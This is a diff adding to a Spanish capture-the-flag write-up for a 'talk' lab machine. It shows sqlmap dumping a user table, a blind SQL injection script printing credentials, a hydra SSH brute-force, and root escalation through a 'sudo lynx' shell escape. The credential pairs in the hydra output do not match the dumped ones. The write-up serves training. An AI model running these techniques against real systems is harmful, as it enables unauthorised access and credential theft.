@@ -52,7 +52,7 @@ available databases [4]:
 [*] mysql
 [*] performance_schema
 
-❯ sqlmap -r ~/Documentos/maquinas/hmv/01-easy/talk/content/req --threads 10 --tables -D chat 
+❯ sqlmap -r /ruta/absoluta/a/request --threads 10 --tables -D chat 
 Database: chat
 [3 tables]
 +-----------+
@@ -61,7 +61,7 @@ Database: chat
 | chat_room |
 +-----------+
 
-❯ sqlmap -r ~/Documentos/maquinas/hmv/01-easy/talk/content/req --dump -D chat -T user
+❯ sqlmap -r /ruta/absoluta/a/request --dump -D chat -T user
 Database: chat
 Table: user
 [5 entries]
@@ -75,4 +75,66 @@ Table: user
 | 3      | tina@tina.com   | 11111       | davidwhatpass   | tina     | tina      |
 +--------+-----------------+-------------+-----------------+----------+-----------+
 
+También, podemos automatizar la extracción con un script en python
+❯ python sqli-blind.py
+...
+[*] Extrayendo registros de `user`...
+  [+] Registro 1
+[+] Extrayendo: pao:pao
+    -> pao:pao
+  [+] Registro 2
+[+] Extrayendo: nona:myfriendtom
+    -> nona:myfriendtom
+  [+] Registro 3
+[+] Extrayendo: tina:davidwhatpass
+    -> tina:davidwhatpass
+  [+] Registro 4
+[+] Extrayendo: jerry:thatsmynonapass
+    -> jerry:thatsmynonapass
+  [+] Registro 5
+[+] Extrayendo: david:adrianthebest
+    -> david:adrianthebest
+...
+
+Formateamos la salida en 2 wordlists, uno con users y otra con passwords, para probar con hydra:
+❯ hydra -L users.txt -P passwds.txt 192.168.1.117 ssh -t 64
+...
+[22][ssh] host: 192.168.1.117   login: jerry   password: myfriendtom
+[22][ssh] host: 192.168.1.117   login: nona   password: thatsmynonapass
+[22][ssh] host: 192.168.1.117   login: david   password: davidwhatpass
+...
+
+Establecemos conexion con el usuario nona y obtenemos la primera flag:
+❯ ssh nona@192.168.1.117
+nona@192.168.1.117's password: thatsmynonapass
+Linux talk 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jul 24 15:12:11 2025 from 192.168.1.5
+nona@talk:~$ 
+
+Para escalar privilegios, ejecutamos el comando sudo -l:
+nona@talk:~$ sudo -l
+Matching Defaults entries for nona on talk:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User nona may run the following commands on talk:
+    (ALL : ALL) NOPASSWD: /usr/bin/lynx 
+
+Podemos ejecutar el comando lynx como cualquier usuario y sin contraseña.
+
+Para obtener una shell del usuario root, ejecutamos lo siguiente:
+nona@talk:~$ sudo /usr/bin/lynx
+! (SHIFT + 1)
+
+Spawning your default shell.  Use 'exit' to return to Lynx.
+
+root@talk:/home/nona# 
+
+Obtenemos nuestra siguiente flag y fin.
 
